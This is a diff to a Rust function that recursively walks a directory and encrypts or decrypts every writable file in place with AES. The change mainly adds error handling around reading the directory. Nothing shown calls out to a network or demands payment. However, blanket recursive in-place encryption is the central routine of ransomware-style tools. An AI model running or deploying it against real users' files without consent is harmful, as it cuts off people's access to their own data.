@@ -3,32 +3,37 @@ use libaes::Cipher;
 
 pub fn encryption(dir: &str, decrypt: bool){
     // read all file in the directory "./exemple" recursively
-    let paths = fs::read_dir(dir).unwrap();
+    
+    match fs::read_dir(dir) {
+        Ok(_) => {
+            let paths = fs::read_dir(dir).unwrap();
+                // show the list of files
+            for path in paths {
+                // if the file is not a directory
+                if path.as_ref().unwrap().path().is_file() {
+                    // show the file name then encrypt the file
+                    //println!("{}", path.unwrap().path().display());
 
-    // show the list of files
-    for path in paths {
-        // if the file is not a directory
-        if path.as_ref().unwrap().path().is_file() {
-            // show the file name then encrypt the file
-            //println!("{}", path.unwrap().path().display());
+                    let file_name = path.unwrap().path().display().to_string();
+                    // check if the script have the permission to read & write the file
+                    if check_file_permission(file_name.as_str()).is_err() {
+                        println!("Error: Permission denied");
+                        continue;
+                    } else {
+                        if decrypt {
+                            decrypt_file(&file_name).unwrap();           
+                        } else {
+                            encrypt_file(&file_name).unwrap();
+                        }
+                    }
 
-            let file_name = path.unwrap().path().display().to_string();
-            // check if the script have the permission to read & write the file
-            if check_file_permission(file_name.as_str()).is_err() {
-                println!("Error: Permission denied");
-                continue;
-            } else {
-                if decrypt {
-                    decrypt_file(&file_name).unwrap();           
                 } else {
-                    encrypt_file(&file_name).unwrap();
+                    // if the file is a directory, go to the directory
+                    encryption(path.unwrap().path().display().to_string().as_str(), decrypt);
                 }
             }
-
-        } else {
-            // if the file is a directory, go to the directory
-            encryption(path.unwrap().path().display().to_string().as_str(), decrypt);
-        }
+        },
+        Err(_) => ()
     }
 }
 
